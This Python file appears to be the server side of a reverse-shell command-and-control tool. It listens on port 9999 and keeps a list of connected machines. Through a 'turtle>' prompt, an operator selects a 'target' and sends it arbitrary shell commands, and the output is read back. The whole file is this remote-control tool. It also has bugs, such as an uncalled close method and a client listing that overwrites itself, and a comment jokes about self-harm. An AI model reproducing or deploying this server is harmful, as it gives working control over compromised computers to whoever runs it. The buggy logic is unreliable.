import socket
import sys
import threading
import time
from queue import Queue

number_of_threads = 2
job_number = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# creates a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global sock
        host = ""
        port = 9999
        sock = socket.socket()

    except socket.error as msg:
        print(f"Socket creation error: {msg}")

# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global sock

        print(f"Binding port {port}")

        sock.bind((host, port))
        sock.listen(5)

    except socket.error as msg:
        print(f"Socket Binding Error {msg} \n retrying")
        bind_socket()


#Handling connections from multiple clients, and saving to a list
def accepting_connection():
    for c in all_connections:
        c.close

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(1)

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


#BUG IS SOMEWHERE BELOW. TAKING A BREAK BEFORE I UNALIVE MYSELF

#see all clients,select a client, and sending commands to clients
def start_turtle():
    while True:
        cmd = input("turtle> ")

        if cmd == "list":
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not found")

# Display current active connections
def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
    print(f"~~~~Clients~~~~ \n {results}")

#selecting target
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]

        print(f"You're now connected to : {all_address[target][0]}")
        print(f"{all_address[target][0]} >", end="")
        return conn

    except:
        print("Selection invalid")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending command")
            break

#Create worker threads
def create_workers():
    for i in range(number_of_threads):
        thread = threading.Thread(target = work)
        thread.daemon = True
        thread.start()

#Do next job in queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for i in job_number:
        queue.put(i)

    queue.join()

create_workers()
create_jobs()
